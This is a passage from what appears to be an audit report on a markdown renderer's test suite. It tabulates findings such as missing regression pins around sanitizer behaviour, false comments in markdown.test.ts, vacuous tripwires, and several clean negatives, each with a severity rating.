fail-safe and was not). The P9 miss is the one that produced T-1 shape 2 and T-5 —
consistent with this workstream's record that the useful findings come from the
predictions that fail, not the ones that hold.

| ref | finding | severity |
|---|---|---|
| T-1 | live arity-pin bypass at HEAD via a template-literal type, two shapes; GREEN 78/123, tsc 0, build 0, phishing form restored | **Blocker** |
| T-2 | B3a (private DOMPurify instance) has no regression pin; revert is GREEN 78/123 and reproduces the `alert(1)` measurement | **Blocker** |
| T-3 | masking pair: `strings:true` ↔ `decls.length !== 1`; string blanking in the arity scan has zero unique fixture coverage | Medium |
| T-4 | three inline fixture tables (9 fixtures) in the ownership check are silently emptyable; `fixtureTableViolation` guards 13 named tables, not these | Medium |
| T-5 | `markdown.test.ts:1696-1698` UNTERMINATED sentence measured false, and unfixtured (B1 green) — written this round, in the fix for the last false sentence | Medium |
| T-6 | `markdown.test.ts:643-644` "exactly the UP direction" measured false; C7-k is also uniquely covered | Medium |
| T-7 | four "eleven" sentences wrong at HEAD; `markdown.test.ts:3205` was false when written | Low |
| T-8 | `markdown.test.ts:2551-2554` "narrower view" — the two R7 views are byte-identical | Low |
| T-9 | both promoted tree-wide tripwires are vacuous; predicates fixtured, call sites not | Info |
| — | §3: B2's positive control is sound on all three criteria | clean negative |
| — | the post-hoc tally sub-form is ABSENT for all five totals | clean negative |
| — | brief §4 item 2 (three production changes) confirmed TRUE; item 1's figures anchored to `538ce54`/`c98eb79`, which also resolves the open note at `markdown.test.ts:3618-3621` | clean negative |
